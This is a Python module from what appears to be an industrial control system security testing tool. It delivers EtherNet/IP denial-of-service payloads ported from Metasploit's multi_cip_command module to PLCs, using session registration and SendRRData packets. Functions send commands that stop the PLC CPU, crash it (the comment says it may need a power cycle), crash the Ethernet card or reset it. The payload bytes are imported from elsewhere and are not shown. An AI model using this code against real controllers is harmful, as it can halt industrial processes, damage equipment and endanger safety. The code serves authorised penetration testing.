"""
EtherNet/IP Attack Commands Mixin

Handles attack payloads from Metasploit multi_cip_command module:
- CPU stop/crash commands
- Ethernet crash/reset commands
- Session-based attack delivery via SendRRData
"""

from __future__ import annotations

import struct
from typing import Any, Dict, TYPE_CHECKING

from ....utils.protocol_helpers import ConnectionHelper
from ..attacks import (
    ATTACK_STOPCPU_PAYLOAD,
    ATTACK_CRASHCPU_PAYLOAD,
    ATTACK_CRASHETHER_PAYLOAD,
    ATTACK_RESETETHER_PAYLOAD,
)
from ..constants import (
    ENIP_CMD_SEND_RR_DATA,
    CIP_GENERAL_STATUS,
)

if TYPE_CHECKING:
    from oida.utils.mixin_protocol import ScannerMixin as _ScannerBase
else:
    _ScannerBase = object


class AttacksMixin(_ScannerBase):
    """Mixin providing EtherNet/IP attack command operations."""

    def _send_attack_command(
        self, host: str, port: int, payload: bytes, attack_name: str
    ) -> Dict[str, Any]:
        """
        Send an attack payload via EtherNet/IP.

        Establishes session, sends payload via SendRRData (0x6F), returns result.
        """
        result = {
            "success": False,
            "attack": attack_name,
            "session_id": None,
            "response_status": None,
            "error": None,
        }

        # Register session first
        session_id = self._register_session(host, port)
        if session_id is None:
            result["error"] = "Failed to register session"
            self.logger.fail(f"[{attack_name}] Failed to register session with {host}:{port}")
            return result

        result["session_id"] = session_id
        self.logger.debug(f"[{attack_name}] Session registered: 0x{session_id:08X}")

        # Build SendRRData packet (0x6F) with attack payload
        # SendRRData structure:
        # - Interface Handle: 0x00000000 (CIP)
        # - Timeout: 0x0000 (no timeout)
        # - Item Count: 0x0002 (2 items)
        # - Item 1: Null Address (type 0x0000, length 0x0000)
        # - Item 2: Unconnected Data (type 0x00B2, length varies, then payload)

        send_rr_header = struct.pack(
            "<IHH HH HH",
            0,  # Interface Handle (CIP)
            0,  # Timeout
            2,  # Item Count
            0x0000,  # Null Address Item Type
            0,  # Null Address Item Length
            0x00B2,  # Unconnected Data Item Type
            len(payload),  # Unconnected Data Item Length
        )

        full_data = send_rr_header + payload

        # Build packet with session handle
        packet = struct.pack(
            "<HHIIQIH",
            ENIP_CMD_SEND_RR_DATA,  # Command (0x6F)
            len(full_data),  # Length
            session_id,  # Session Handle
            0,  # Status
            0,  # Sender Context
            0,  # Options
            0,  # Pad
        )
        # Fix: proper 24-byte header
        packet = struct.pack(
            "<HH I I Q I",
            ENIP_CMD_SEND_RR_DATA,  # Command (0x6F)
            len(full_data),  # Length
            session_id,  # Session Handle
            0,  # Status
            0,  # Sender Context
            0,  # Options
        )
        packet = packet + full_data

        sock = None
        try:
            sock = ConnectionHelper.create_tcp_socket(host, port, self.timeout)
            sock.send(packet)
            response = sock.recv(4096)

            if response:
                resp_header = self._parse_enip_header(response)
                if resp_header:
                    result["response_status"] = resp_header["status"]
                    if resp_header["status"] != 0:
                        result["error"] = f"ENIP error: 0x{resp_header['status']:08X}"
                        self.logger.fail(
                            f"[{attack_name}] ENIP error: 0x{resp_header['status']:08X}"
                        )
                    else:
                        # Parse CIP-level response from CPF data
                        cip_status = self._parse_cip_response(response)
                        result["cip_status"] = cip_status
                        if cip_status["general_status"] == 0:
                            result["success"] = True
                            self.logger.success(f"[{attack_name}] Command executed successfully")
                        else:
                            status_code = cip_status["general_status"]
                            status_text = CIP_GENERAL_STATUS.get(status_code, "Unknown")
                            result["error"] = f"CIP error 0x{status_code:02X}: {status_text}"
                            self.logger.fail(
                                f"[{attack_name}] CIP error 0x{status_code:02X}: {status_text}"
                            )
            else:
                # No response is INCONCLUSIVE — could be a filter, slow PLC,
                # or a crash. Don't lie to the caller about "success" — every
                # blocked-by-firewall run otherwise emitted a CRITICAL
                # finding "command executed". Mark inconclusive and let the
                # caller decide.
                result["success"] = False
                result["inconclusive"] = True
                result["error"] = "No response (inconclusive — could be filter, slow PLC, or crash)"
                self.logger.warning(
                    f"[{attack_name}] No response — INCONCLUSIVE (not asserting crash)"
                )

        except TimeoutError:
            # Same as above: timeout means we don't know.
            result["success"] = False
            result["inconclusive"] = True
            result["error"] = "Timeout (inconclusive — could be filter, slow PLC, or crash)"
            self.logger.warning(
                f"[{attack_name}] Timeout — INCONCLUSIVE (not asserting crash)"
            )
        except Exception as e:
            self.logger.debug(f"send attack command failed: {e}")
            result["error"] = str(e)
            self.logger.fail(f"[{attack_name}] Error: {e}")
        finally:
            if sock:
                try:
                    sock.close()
                except Exception as e:
                    self.logger.debug(f"send attack command failed: {e}")
                    pass  # Ignore socket close errors

        return result

    def _cpu_stop(self, host: str, port: int = 44818) -> Dict[str, Any]:
        """
        Send CPU STOP command to halt PLC execution.

        WARNING: This will stop the PLC program execution!
        """
        self.logger.warning("[!] Sending CPU STOP command - PLC execution will halt!")
        return self._send_attack_command(host, port, ATTACK_STOPCPU_PAYLOAD, "STOPCPU")

    def _crash_cpu(self, host: str, port: int = 44818) -> Dict[str, Any]:
        """
        Send malformed CIP message to crash PLC CPU.

        WARNING: This may require a power cycle to recover!
        """
        self.logger.warning("[!] Sending CPU CRASH command - device may require power cycle!")
        return self._send_attack_command(host, port, ATTACK_CRASHCPU_PAYLOAD, "CRASHCPU")

    def _crash_ethernet(self, host: str, port: int = 44818) -> Dict[str, Any]:
        """
        Crash Ethernet card via malformed TCP/IP Interface write.

        WARNING: This will disconnect the device from the network!
        """
        self.logger.warning("[!] Sending Ethernet CRASH command - device will disconnect!")
        return self._send_attack_command(host, port, ATTACK_CRASHETHER_PAYLOAD, "CRASHETHER")

    def _reset_ethernet(self, host: str, port: int = 44818) -> Dict[str, Any]:
        """
        Reset Ethernet interface using CIP Reset service.

        This will briefly disconnect the device but should auto-recover.
        """
        self.logger.display("[*] Sending Ethernet RESET command...")
        return self._send_attack_command(host, port, ATTACK_RESETETHER_PAYLOAD, "RESETETHER")
